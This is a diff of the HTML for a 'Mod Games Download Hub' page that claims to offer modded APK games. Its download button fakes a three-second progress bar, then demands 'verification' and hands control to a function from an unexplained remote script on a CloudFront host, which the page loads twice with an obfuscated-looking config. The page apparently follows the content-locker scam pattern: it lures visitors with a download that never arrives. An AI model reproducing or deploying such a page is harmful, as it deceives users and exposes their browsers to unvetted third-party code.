@@ -3,186 +3,386 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<script type="text/javascript">
-    var VwsPf_WTs_nOaXhc={"it":4300776,"key":"6acd6"};
-</script>
-<script src="https://d16w9e5gvnj8jg.cloudfront.net/9dd572c.js"></script>
-  <title>Mod Games Download Page</title>
+  <script type="text/javascript">
+    var EHtyM_SDP_qMrxNc={"it":4398705,"key":"c2da4"};
+  </script>
+  <script src="https://d2rst8vhtu89fd.cloudfront.net/dcd5a4e.js"></script>
+  <title>Mod Games Download Hub</title>
   <style>
-    /* CSS styles */
-    body {
-      font-family: Arial, sans-serif;
+    :root {
+      --primary-color: #6C63FF;
+      --secondary-color: #4FACFE;
+      --background-dark: #1A1B26;
+      --card-bg: #242535;
+      --text-primary: #ffffff;
+      --text-secondary: #B4B4B4;
+    }
+
+    * {
       margin: 0;
       padding: 0;
-      background-color: #1D222D;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background: linear-gradient(135deg, var(--background-dark), #2A2C3E);
+      color: var(--text-primary);
+      line-height: 1.6;
+      min-height: 100vh;
+      position: relative;
+      padding-bottom: 60px; /* Space for footer */
     }
 
     header {
-      background-color: #13161D;
-      padding: 20px;
-      text-align: center;
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      padding: 15px 20px;
+      position: fixed;
+      width: 100%;
+      top: 0;
+      z-index: 1000;
+      box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
     }
 
     header h1 {
+      font-size: clamp(1.5rem, 5vw, 2.5rem);
+      text-align: center;
+      background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
       margin: 0;
-      font-size: 36px;
-      color: #13EFF7;
-      text-shadow: 4px 4px 4px rgba(13, 90, 233, 0.5);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
     }
 
     .container {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      max-width: 600px;
-      margin: 50px auto;
-      background-color: #fff;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-      text-align: center;
-      opacity: 0;
-      transform: translateY(-50px);
-      transition: opacity 1s, transform 1s;
+      width: min(800px, 95%);
+      margin: 100px auto 30px;
+      padding: 20px 15px;
     }
 
-    .container.show {
-      opacity: 1;
+    .download-card {
+      background: var(--card-bg);
+      border-radius: 15px;
+      padding: clamp(20px, 5vw, 40px);
+      margin-bottom: 30px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
       transform: translateY(0);
+      transition: transform 0.3s ease;
+    }
+
+    .game-info {
+      text-align: center;
+      margin-bottom: clamp(20px, 4vw, 30px);
+    }
+
+    .game-info h2 {
+      font-size: clamp(1.5rem, 4vw, 2rem);
+      margin-bottom: 15px;
+      background: linear-gradient(45deg, #4FACFE, #00F2FE);
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+      padding: 0 10px;
+    }
+
+    .game-info p {
+      font-size: clamp(0.9rem, 3vw, 1rem);
+      color: var(--text-secondary);
+      padding: 0 10px;
     }
 
     .download-button {
       display: inline-block;
-      background-color: #38B6FF;
-      color: #fff;
-      padding: 12px 30px;
-      margin-top: 30px;
+      background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+      color: white;
+      padding: clamp(12px, 3vw, 15px) clamp(25px, 5vw, 40px);
+      border-radius: 30px;
       text-decoration: none;
-      border-radius: 5px;
-      font-size: 20px;
-      transition: background-color 0.3s ease;
-      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+      font-weight: bold;
+      font-size: clamp(1rem, 3vw, 1.2rem);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+      border: none;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      width: min(100%, 300px);
+      touch-action: manipulation;
     }
 
-    .download-button:hover {
-      background-color: #0082cd;
+    .download-button:active {
+      transform: scale(0.98);
+    }
+
+    .download-button::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(
+        90deg,
+        transparent,
+        rgba(255, 255, 255, 0.2),
+        transparent
+      );
+      transition: 0.5s;
+    }
+
+    .steps-container {
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 15px;
+      padding: clamp(20px, 4vw, 30px);
+      margin-top: clamp(30px, 5vw, 40px);
+    }
+
+    .steps-container h3 {
+      text-align: center;
+      margin-bottom: clamp(20px, 4vw, 25px);
+      color: var(--secondary-color);
+      font-size: clamp(1.1rem, 3vw, 1.3rem);
+    }
+
+    .steps-list {
+      list-style: none;
+      counter-reset: step-counter;
+      padding: 0 10px;
+    }
+
+    .steps-list li {
+      margin-bottom: clamp(15px, 3vw, 20px);
+      padding-left: 45px;
+      position: relative;
+      color: var(--text-secondary);
+      font-size: clamp(0.9rem, 2.5vw, 1rem);
+    }
+
+    .steps-list li::before {
+      counter-increment: step-counter;
+      content: counter(step-counter);
+      position: absolute;
+      left: 0;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 30px;
+      height: 30px;
+      background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
+      font-size: 0.9rem;
+    }
+
+    .progress-bar {
+      width: min(100%, 300px);
+      height: 4px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 2px;
+      margin: 20px auto 0;
+      overflow: hidden;
+      display: none;
+    }
+
+    .progress-bar .progress {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+      transition: width 3s ease-in-out;
     }
 
     footer {
-      background-color: #333;
-      color: #fff;
-      padding: 10px;
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      padding: 15px;
       text-align: center;
       position: fixed;
       bottom: 0;
       width: 100%;
+      z-index: 1000;
     }
 
     footer p {
-      margin: 0;
-      font-size: 12px;
+      color: var(--text-secondary);
+      font-size: clamp(0.8rem, 2.5vw, 0.9rem);
     }
 
-    .container h2 {
-      font-size: 32px;
-      margin-bottom: 30px;
-      color: #13EFF7;
-      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
-    }
-
-    .container ol {
-      text-align: left;
-      font-size: 18px;
-      margin-left: 30px;
-      margin-bottom: 30px;
-    }
-
-    .container ol li {
-      margin-bottom: 15px;
-      position: relative;
-      padding-left: 20px;
-      color: #555;
-    }
-
-    .container ol li::before {
-      content: '';
-      position: absolute;
-      left: 0;
-      top: 8px;
-      width: 10px;
-      height: 10px;
-      border-radius: 50%;
-      background-color: #0a23ff;
-      box-shadow: 0 0 10px rgba(23, 58, 255, 0.5);
-    }
-
-    @media only screen and (max-width: 600px) {
+    /* Mobile-specific styles */
+    @media (max-width: 480px) {
       .container {
+        margin-top: 80px;
+        padding: 10px;
+      }
+
+      .download-card {
         padding: 20px;
-        margin: 20px 20px;
       }
 
-      .container h2 {
-        font-size: 26px;
+      .steps-list li {
+        padding-left: 40px;
+        margin-bottom: 15px;
       }
 
-      .container ol {
-        font-size: 16px;
-        margin-left: 0;
-        padding-left: 0;
+      .steps-list li::before {
+        width: 25px;
+        height: 25px;
+        font-size: 0.8rem;
       }
 
-      .container ol li {
-        padding-left: 15px;
-        margin-left: 10px;
+      .download-button {
+        width: 100%;
+        max-width: none;
+        padding: 12px 20px;
+      }
+    }
+
+    /* Tablet styles */
+    @media (min-width: 481px) and (max-width: 768px) {
+      .container {
+        margin-top: 90px;
+      }
+
+      .download-card {
+        padding: 25px;
+      }
+    }
+
+    /* Touch device optimizations */
+    @media (hover: hover) {
+      .download-button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 10px 20px rgba(108, 99, 255, 0.2);
+      }
+
+      .download-button:hover::before {
+        left: 100%;
+      }
+
+      .download-card:hover {
+        transform: translateY(-5px);
+      }
+    }
+
+    /* Dark mode support */
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --card-bg: #242535;
+        --text-primary: #ffffff;
+        --text-secondary: #B4B4B4;
+      }
+    }
+
+    /* High contrast mode */
+    @media (prefers-contrast: high) {
+      :root {
+        --primary-color: #0066FF;
+        --secondary-color: #0099FF;
+      }
+    }
+
+    /* Reduced motion preferences */
+    @media (prefers-reduced-motion: reduce) {
+      * {
+        animation: none !important;
+        transition-duration: 0.001ms !important;
       }
     }
   </style>
 </head>
 <body>
   <header>
-    <h1>Mod Games Download Page</h1>
+    <h1>Mod Games Download Hub</h1>
   </header>
+  <div class="container">
+    <div class="download-card">
+      <div class="game-info">
+        <h2>Apk Mod Game is Ready! For Download</h2>
+      </div>
+      
+      <center>
+        <button class="download-button" id="downloadBtn" onclick="_eN()">Download Now</button>
+        <div class="progress-bar" id="progressBar">
+          <div class="progress" id="progress"></div>
+        </div>
+      </center>
 
-  <main>
-    <div class="container">
-      <h2>Your mod Game is ready to download now!</h2>
-      <a href="#" class="download-button" onclick="_Jf()">Download Now</a>
-      <h3 style="font-size: 24px; margin-top: 40px;">How to Download Your Mod from Our Website:</h3>
-      <ol>
-        <li>Select your desired mod app or game</li>
-        <li>Complete the human verification process</li>
-        <li>Click the download button</li>
-        <li>After verification, your download will start automatically</li>
-      </ol>
+      <div class="steps-container">
+        <h3>Download Guide</h3>
+        <ol class="steps-list">
+          <li>Click the download button to begin</li>
+          <li>Complete a quick verification check</li>
+          <li>Wait for the verification process to complete</li>
+          <li>Your download will start automatically</li>
+        </ol>
+      </div>
     </div>
-  </main>
+  </div>
 
   <footer>
-    <p>&copy; 2023 - All rights reserved - Mod Game</p>
+    <p>&copy; 2024 Mod Games Hub - All rights reserved</p>
   </footer>
- <script>
-  // JavaScript code for the download button animation
-  const container = document.querySelector('.container');
+     <script type="text/javascript">
+    var EHtyM_SDP_qMrxNc={"it":4398705,"key":"c2da4"};
+  </script>
+  <script src="https://d2rst8vhtu89fd.cloudfront.net/dcd5a4e.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const downloadBtn = document.getElementById('downloadBtn');
+      const progressBar = document.getElementById('progressBar');
+      const progress = document.getElementById('progress');
 
-  window.addEventListener('load', () => {
-    container.classList.add('show');
-  });
+      // Disable double-tap zoom on buttons for mobile
+      downloadBtn.addEventListener('touchend', (e) => {
+        e.preventDefault();
+      });
 
-  const downloadButton = document.querySelector('.download-button');
+      // Handle download button click
+      downloadBtn.addEventListener('click', () => {
+        // Provide immediate feedback
+        navigator.vibrate && navigator.vibrate(50);
+        
+        downloadBtn.textContent = 'Processing...';
+        downloadBtn.style.opacity = '0.7';
+        progressBar.style.display = 'block';
+        
+        // Animate progress bar
+        requestAnimationFrame(() => {
+          progress.style.width = '100%';
+        });
 
-  downloadButton.addEventListener('click', () => {
-    downloadButton.innerHTML = 'Downloading...';
-    downloadButton.classList.add('downloading');
+        // Simulate verification process
+        setTimeout(() => {
+          downloadBtn.textContent = 'Verification Required';
+          downloadBtn.style.opacity = '1';
+          progress.style.width = '0%';
+          progressBar.style.display = 'none';
+          
+          // Your verification function call here
+          if (typeof _Jf === 'function') {
+            _Jf();
+          }
+        }, 3000);
+      });
 
-    // Simulating a delay for the download process
-    setTimeout(() => {
-      downloadButton.innerHTML = 'please verify you are not a bot Fist';
-      downloadButton.classList.remove('downloading');
-    }, 3000);
-  });
-</script>
-
+      // Handle visibility change for better performance
+      document.addEventListener('visibilitychange', () => {
+        if (document.hidden) {
+          progress.style.transition = 'none';
+        } else {
+          progress.style.transition = 'width 3s ease-in-out';
+        }
+      });
+    });
+  </script>
+  
 </body>
 </html>
